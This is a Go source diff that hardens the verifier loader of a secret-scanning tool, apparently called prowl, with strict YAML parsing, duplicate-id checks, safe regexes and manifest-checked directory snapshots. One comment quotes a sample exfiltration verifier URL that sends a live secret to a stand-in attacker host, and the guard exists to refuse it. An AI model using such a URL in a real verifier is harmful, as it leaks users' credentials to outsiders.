@@ -1,23 +1,28 @@
 package verify
 
 import (
+	"bytes"
 	"encoding/base64"
+	"errors"
 	"fmt"
-	"io/fs"
+	"io"
 	"os"
-	"path/filepath"
 	"regexp"
 	"strings"
 	"time"
 
+	"github.com/Lercas/prowl/tool/internal/localfile"
 	"github.com/Lercas/prowl/tool/internal/logx"
+	"github.com/Lercas/prowl/tool/internal/rules"
 	"github.com/Lercas/prowl/tool/internal/safehttp"
+	"github.com/Lercas/prowl/tool/internal/saferegex"
 	"gopkg.in/yaml.v3"
 )
 
 // Load reads verifier YAML from the given files/dirs (dirs walked recursively for *.yaml/*.yml),
 // compiles their matchers, and returns a ready Set. Invalid files surface as an error after the
-// valid ones load, so one typo never disables verification. Uses the default bundled-trust policy;
+// valid ones load for diagnostics; runtime callers must reject any error to preserve coverage.
+// Uses the default bundled-trust policy;
 // use LoadWithPolicy for an untrusted/remote set or to opt into --allow-unsigned.
 func Load(timeout time.Duration, paths ...string) (*Set, error) {
 	return LoadWithPolicy(timeout, LoadPolicy{}, paths...)
@@ -32,31 +37,52 @@ func LoadWithPolicy(timeout time.Duration, policy LoadPolicy, paths ...string) (
 	}
 	s := &Set{client: safehttp.Client(timeout), sem: make(chan struct{}, concurrency)}
 	var errs []string
+	seen := map[string]string{}
 	// add parses one verifier file. signed reports whether the file came from a manifest-verified set,
 	// which governs the exfil guard (refuse vs. warn) below.
-	add := func(path string, signed bool) {
-		raw, err := os.ReadFile(path)
-		if err != nil {
-			errs = append(errs, err.Error())
-			return
-		}
-		for _, doc := range strings.Split(string(raw), "\n---") {
-			if strings.TrimSpace(doc) == "" {
+	add := func(path string, raw []byte, signed bool) {
+		dec := yaml.NewDecoder(bytes.NewReader(raw))
+		for {
+			var doc yaml.Node
+			if err := dec.Decode(&doc); err != nil {
+				if !errors.Is(err, io.EOF) {
+					errs = append(errs, fmt.Sprintf("%s: %v", path, err))
+				}
+				break
+			}
+			if len(doc.Content) == 0 || doc.Content[0].Tag == "!!null" {
 				continue
 			}
-			var v Verifier
-			if err := yaml.Unmarshal([]byte(doc), &v); err != nil {
+			data, err := yaml.Marshal(&doc)
+			if err != nil {
 				errs = append(errs, fmt.Sprintf("%s: %v", path, err))
 				continue
 			}
-			if v.ID == "" || len(v.Requests) == 0 || len(v.Match) == 0 {
-				continue // not a verifier doc (e.g. a rule template sharing the dir)
+			// Co-located detection templates remain supported, but a broken verifier can never
+			// be classified as an unrelated document just because a required field is missing.
+			if isDetectionTemplate(doc.Content[0]) {
+				if _, err := rules.ParseTemplate(data, path); err != nil {
+					errs = append(errs, err.Error())
+				}
+				continue
+			}
+			var v Verifier
+			strict := yaml.NewDecoder(bytes.NewReader(data))
+			strict.KnownFields(true)
+			if err := strict.Decode(&v); err != nil {
+				errs = append(errs, fmt.Sprintf("%s: %v", path, err))
+				continue
 			}
 			v.path = path
 			if err := compileVerifier(&v); err != nil {
 				errs = append(errs, err.Error())
 				continue
 			}
+			if prev, exists := seen[v.ID]; exists {
+				errs = append(errs, fmt.Sprintf("%s: duplicate verifier id %q (also in %s)", path, v.ID, prev))
+				continue
+			}
+			seen[v.ID] = path
 			// Exfil guard (defense in depth): a URL that interpolates the live {{secret}} is the
 			// exfil pattern — the SSRF guard allows public hosts, so a verifier like
 			// `url: https://attacker.test/?k={{secret}}` would ship the plaintext secret out. Refuse it
@@ -83,29 +109,29 @@ func LoadWithPolicy(timeout time.Duration, policy LoadPolicy, paths ...string) (
 			continue
 		}
 		if info.IsDir() {
+			snapshot, err := readDirectorySnapshot(p, true)
+			if err != nil {
+				errs = append(errs, err.Error())
+				continue
+			}
 			// Integrity gate: hash every file against the dir's MANIFEST.sha256, refusing a tampered or
 			// unlisted set before the parser sees it. signed gates the per-verifier exfil guard.
-			allowed, signed, ierr := checkIntegrity(p, policy)
+			_, signed, ierr := checkSnapshot(p, policy, snapshot)
 			if ierr != nil {
 				logx.Error("verifier set integrity check failed", "error", ierr.Error())
 				errs = append(errs, ierr.Error())
 				continue // refuse the whole set; do not load any file from it
 			}
-			_ = filepath.WalkDir(p, func(path string, d fs.DirEntry, err error) error {
-				if err != nil || d.IsDir() {
-					return nil
-				}
-				if ext := strings.ToLower(filepath.Ext(path)); ext == ".yaml" || ext == ".yml" {
-					rel, rerr := filepath.Rel(p, path)
-					if rerr == nil && !allowed[filepath.ToSlash(rel)] {
-						return nil // not cleared by the manifest (already accounted for above)
-					}
-					add(path, signed)
-				}
-				return nil
-			})
+			for _, file := range snapshot.files {
+				add(file.path, file.raw, signed)
+			}
 		} else {
-			add(p, false) // a loose single file has no manifest to bless it
+			raw, err := localfile.ReadRegular(p, MaxVerifierSize)
+			if err != nil {
+				errs = append(errs, err.Error())
+				continue
+			}
+			add(p, raw, false) // a loose single file has no manifest to bless it
 		}
 	}
 	if len(errs) > 0 {
@@ -114,15 +140,60 @@ func LoadWithPolicy(timeout time.Duration, policy LoadPolicy, paths ...string) (
 	return s, nil
 }
 
+func isDetectionTemplate(node *yaml.Node) bool {
+	if node.Kind != yaml.MappingNode {
+		return false
+	}
+	template := false
+	for i := 0; i+1 < len(node.Content); i += 2 {
+		switch node.Content[i].Value {
+		case "match", "requests", "extract", "sign", "sign_params":
+			return false
+		case "matchers", "extractors", "category":
+			template = true
+		}
+	}
+	return template
+}
+
+func validCombination(value string) bool {
+	return value == "" || strings.EqualFold(value, "and") || strings.EqualFold(value, "or")
+}
+
 func compileVerifier(v *Verifier) error {
+	if strings.TrimSpace(v.ID) == "" || len(v.Match) == 0 || len(v.Requests) == 0 {
+		return fmt.Errorf("%s: verifier needs id, match and requests", v.path)
+	}
+	for _, match := range v.Match {
+		if strings.TrimSpace(match) == "" {
+			return fmt.Errorf("%s (%s): empty match selector", v.path, v.ID)
+		}
+	}
+	if _, exists := v.Extract["secret"]; exists {
+		return fmt.Errorf("%s (%s): extract cannot replace reserved variable secret", v.path, v.ID)
+	}
 	for i := range v.Requests {
+		r := &v.Requests[i]
+		if strings.TrimSpace(r.URL) == "" {
+			return fmt.Errorf("%s (%s): request %d needs url", v.path, v.ID, i)
+		}
+		if !validCombination(r.MatchersCondition) {
+			return fmt.Errorf("%s (%s): invalid matchers-condition %q", v.path, v.ID, r.MatchersCondition)
+		}
 		for j := range v.Requests[i].Matchers {
 			m := &v.Requests[i].Matchers[j]
 			if m.Type == "" {
 				m.Type = "status"
 			}
+			if err := validateMatcher(m); err != nil {
+				return fmt.Errorf("%s (%s): %w", v.path, v.ID, err)
+			}
+			m.res = nil
 			for _, rx := range m.Regex {
-				re, err := regexp.Compile(rx)
+				if rx == "" {
+					return fmt.Errorf("%s (%s): empty regex pattern", v.path, v.ID)
+				}
+				re, err := saferegex.Compile(rx)
 				if err != nil {
 					return fmt.Errorf("%s (%s): bad matcher regex %q: %w", v.path, v.ID, rx, err)
 				}
@@ -131,7 +202,7 @@ func compileVerifier(v *Verifier) error {
 		}
 	}
 	for name, rx := range v.Extract {
-		re, err := regexp.Compile(rx)
+		re, err := saferegex.Compile(rx)
 		if err != nil {
 			return fmt.Errorf("%s (%s): bad extract regex %q: %w", v.path, v.ID, rx, err)
 		}
@@ -148,26 +219,89 @@ func compileVerifier(v *Verifier) error {
 	return nil
 }
 
+func validateMatcher(m *Matcher) error {
+	condition := strings.ToLower(m.Condition)
+	if condition != "" && condition != "and" && condition != "or" {
+		return fmt.Errorf("invalid matcher condition")
+	}
+	if m.Part != "" && m.Part != "body" && m.Part != "header" {
+		return fmt.Errorf("invalid matcher part")
+	}
+	switch m.Type {
+	case "status":
+		if len(m.Status) == 0 {
+			return fmt.Errorf("empty status matcher")
+		}
+		for _, code := range m.Status {
+			if code < 100 || code > 599 {
+				return fmt.Errorf("invalid HTTP status matcher")
+			}
+		}
+	case "word":
+		if len(m.Words) == 0 {
+			return fmt.Errorf("empty word matcher")
+		}
+		for _, word := range m.Words {
+			if word == "" {
+				return fmt.Errorf("empty matcher word")
+			}
+		}
+	case "regex":
+		if len(m.Regex) == 0 {
+			return fmt.Errorf("empty regex matcher")
+		}
+		for _, pattern := range m.Regex {
+			if pattern == "" {
+				return fmt.Errorf("empty matcher regex")
+			}
+		}
+	default:
+		return fmt.Errorf("unknown matcher type")
+	}
+	return nil
+}
+
 // Verifiers returns the loaded verifiers.
 func (s *Set) Verifiers() []*Verifier { return s.verifiers }
 
 // Path returns the source file the verifier was loaded from.
 func (v *Verifier) Path() string { return v.path }
 
-var reBase64Fn = regexp.MustCompile(`\{\{base64\(([^)]*)\)\}\}`)
+var reInterpolation = regexp.MustCompile(`\{\{base64\(([^)]*)\)\}\}|\{\{([^{}]+)\}\}`)
+var reExpressionVar = regexp.MustCompile(`\{\{([^{}]+)\}\}|[A-Za-z_][A-Za-z0-9_]*`)
 
-// interpolate substitutes vars into a template: {{name}} -> vars[name], {{base64(EXPR)}} -> base64
-// of EXPR with each {{name}} expanded first.
-func interpolate(tmpl string, vars map[string]string) string {
-	out := reBase64Fn.ReplaceAllStringFunc(tmpl, func(m string) string {
-		inner := reBase64Fn.FindStringSubmatch(m)[1]
-		for name, val := range vars {
-			inner = strings.ReplaceAll(inner, name, val)
+// expandTemplate expands each original placeholder once. Inserted credentials are literal bytes,
+// never another template; bare identifiers inside base64 expressions substitute whole names only.
+func expandTemplate(tmpl string, vars map[string]string) (string, error) {
+	var problem error
+	out := reInterpolation.ReplaceAllStringFunc(tmpl, func(token string) string {
+		parts := reInterpolation.FindStringSubmatch(token)
+		lookup := func(name, original string, required bool) string {
+			value, exists := vars[name]
+			if exists && value != "" {
+				return value
+			}
+			if required || exists {
+				problem = errBadInterpolation
+			}
+			return original
 		}
-		return base64.StdEncoding.EncodeToString([]byte(inner))
+		if parts[2] != "" {
+			return lookup(parts[2], token, true)
+		}
+		expr := reExpressionVar.ReplaceAllStringFunc(parts[1], func(word string) string {
+			parts := reExpressionVar.FindStringSubmatch(word)
+			if parts[1] != "" {
+				return lookup(parts[1], word, true)
+			}
+			return lookup(word, word, false)
+		})
+		return base64.StdEncoding.EncodeToString([]byte(expr))
 	})
-	for name, val := range vars {
-		out = strings.ReplaceAll(out, "{{"+name+"}}", val)
-	}
+	return out, problem
+}
+
+func interpolate(tmpl string, vars map[string]string) string {
+	out, _ := expandTemplate(tmpl, vars)
 	return out
 }
